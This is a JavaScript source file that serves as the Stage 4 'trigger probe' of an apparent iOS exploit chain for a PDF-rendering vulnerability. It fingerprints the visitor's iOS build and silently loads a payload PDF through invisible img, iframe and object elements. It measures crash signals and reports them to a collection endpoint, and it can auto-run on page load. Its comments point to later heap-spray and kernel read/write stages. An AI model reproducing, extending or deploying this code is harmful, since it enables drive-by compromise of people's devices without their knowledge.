/**
 * CVE-2026-86950 GlyphGrift PDF trigger probe (Phase 1 / Stage 4).
 * Delivery vector from window.__L0FCK_GLYPHGRIFT_VECTOR ('img' | 'embed')
 * or ?glyphgrift_vector=img|embed. Reports to /api/glyphgrift-result.
 *
 * V2 stages 5–8 (heap spray → multi-PDF → captive_krw → AMFI/SEP) live in
 * glyphgrift_heap_spray.js / glyphgrift_post_trigger.js and PLAN/glyphgrift_plan_V2.md.
 * Crash/OOB telemetry alone must never imply RCE or krw_ready.
 */
(function () {
  'use strict';

  var PDF_URL = window.__L0FCK_GLYPHGRIFT_PDF || '/payload/glyphgrift/trigger.pdf';
  var API = '/api/glyphgrift-result';

  function guessBuild() {
    var ua = (navigator && navigator.userAgent) || '';
    var m = ua.match(/Mobile\/([A-Z0-9]+)/);
    if (m) return m[1];
    m = ua.match(/OS (\d+)[_.](\d+)(?:[_.](\d+))?/);
    if (m) return 'iOS_' + m[1] + '.' + m[2] + (m[3] ? '.' + m[3] : '');
    return 'unknown';
  }

  function resolveVector() {
    if (window.__L0FCK_GLYPHGRIFT_VECTOR === 'embed' ||
        window.__L0FCK_GLYPHGRIFT_VECTOR === 'img') {
      return window.__L0FCK_GLYPHGRIFT_VECTOR;
    }
    try {
      var q = (window.location && window.location.search) || '';
      var m = q.match(/(?:\?|&)glyphgrift_vector=(img|embed)(?:&|$)/);
      if (m) return m[1];
    } catch (e) {}
    return 'img';
  }

  function postResult(payload) {
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  function runImgVector(done) {
    var t0 = performance.now();
    var img = document.createElement('img');
    img.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;';
    img.alt = '';
    var settled = false;
    function finish(loaded, err) {
      if (settled) return;
      settled = true;
      var ms = +(performance.now() - t0).toFixed(2);
      done({
        img_loaded: !!loaded,
        img_error: !!err,
        render_time_ms: ms,
        crash_suspected: !!err && ms < 50
      });
    }
    img.onload = function () { finish(true, false); };
    img.onerror = function () { finish(false, true); };
    setTimeout(function () {
      if (!settled) finish(false, true);
    }, 8000);
    img.src = PDF_URL;
    document.body.appendChild(img);
  }

  function runEmbedVector(done) {
    var t0 = performance.now();
    var settled = false;
    function finish(loaded, err) {
      if (settled) return;
      settled = true;
      var ms = +(performance.now() - t0).toFixed(2);
      done({
        img_loaded: !!loaded,
        img_error: !!err,
        render_time_ms: ms,
        crash_suspected: !!err && ms < 80
      });
    }

    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'position:absolute;width:2px;height:2px;opacity:0;border:0;';
    iframe.onload = function () { finish(true, false); };
    iframe.onerror = function () { finish(false, true); };
    iframe.src = PDF_URL;
    document.body.appendChild(iframe);

    var obj = document.createElement('object');
    obj.type = 'application/pdf';
    obj.data = PDF_URL;
    obj.style.cssText = 'position:absolute;width:2px;height:2px;opacity:0;';
    document.body.appendChild(obj);

    setTimeout(function () {
      if (!settled) finish(false, true);
    }, 8000);
  }

  function tryCanvas(cb) {
    if (typeof createImageBitmap !== 'function' || typeof fetch !== 'function') {
      cb(null);
      return;
    }
    fetch(PDF_URL)
      .then(function (r) { return r.blob(); })
      .then(function (blob) { return createImageBitmap(blob); })
      .then(function () { cb(null); })
      .catch(function (err) {
        cb(String(err && err.message ? err.message : err));
      });
  }

  function execute(ctx) {
    var vector = resolveVector();
    if (ctx && ctx.log) ctx.log('glyphgrift vector=' + vector + ' pdf=' + PDF_URL);

    return new Promise(function (resolve) {
      var deliver = vector === 'embed' ? runEmbedVector : runImgVector;
      deliver(function (base) {
        tryCanvas(function (canvasExc) {
          var payload = {
            probe_id: 'glyphgrift_pdf_trigger',
            vector: vector,
            img_loaded: !!base.img_loaded,
            img_error: !!base.img_error,
            render_time_ms: base.render_time_ms,
            canvas_exception: !!canvasExc,
            crash_suspected: !!base.crash_suspected || !!canvasExc,
            build: guessBuild(),
            error_message: canvasExc || ''
          };
          postResult(payload).then(function () {
            if (ctx && ctx.report) {
              return ctx.report(
                'glyphgrift_pdf_trigger',
                payload.crash_suspected ? 'crash_suspected' : 'ok',
                JSON.stringify(payload)
              );
            }
          }).then(resolve, resolve);
        });
      });
    });
  }

  window.__L0FCK_STAGE4_RUNNERS = window.__L0FCK_STAGE4_RUNNERS || {};
  window.__L0FCK_STAGE4_RUNNERS.glyphgrift_pdf_trigger = function (ctx) {
    return execute(ctx);
  };

  /* Standalone auto-run when GlyphGrift HTML sets the flag */
  if (window.__L0FCK_GLYPHGRIFT_AUTO === true) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function () { execute(null); });
    } else {
      setTimeout(function () { execute(null); }, 0);
    }
  }
})();
